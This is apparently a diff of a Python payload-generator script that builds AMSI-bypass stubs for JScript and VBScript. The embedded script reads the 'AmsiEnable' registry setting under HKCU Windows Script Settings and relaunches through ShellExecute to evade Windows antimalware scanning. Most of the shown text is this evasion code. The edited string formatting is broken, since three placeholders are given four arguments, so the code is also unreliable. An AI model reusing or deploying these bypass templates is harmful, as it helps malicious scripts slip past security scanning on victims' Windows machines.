@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 
 def amsi_stub(file_type, technique, filename):
 
@@ -18,7 +18,7 @@ try{
 	WScript.Quit(1);
 }\n\n"""
 
-    js_bypass_1 = """\nvar regpath = "HKCU\\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
+    js_bypass_1 = r"""%svar regpath = "HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
 var exit=0;
 var WinNetwork = new ActiveXObject("WScript.Network");
 var u = WinNetwork.UserName;
@@ -34,7 +34,7 @@ obj.Document.Application.ShellExecute(j,null,"C:\\Windows\\System32",null,0);
 exit=1;
 }
 if(!exit){
-\n\n""" % (filename)
+%s%s""" % ("\n", filename, "\n", "\n")
 
     vbs_bypass_1 = """\nregpath = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"
 u = CreateObject("WScript.Network").UserName
